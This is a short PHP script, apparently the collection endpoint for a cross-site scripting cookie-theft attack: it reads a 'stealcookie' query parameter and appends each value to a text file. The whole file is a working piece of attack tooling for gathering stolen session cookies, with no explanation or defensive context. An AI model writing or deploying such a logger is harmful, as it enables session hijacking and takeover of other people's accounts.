<?php
$c = $_GET["stealcookie"];
$f = fopen('stealcookie.txt', 'a');
fwrite($f, "$c\n-----\n");
fclose($f);
?>
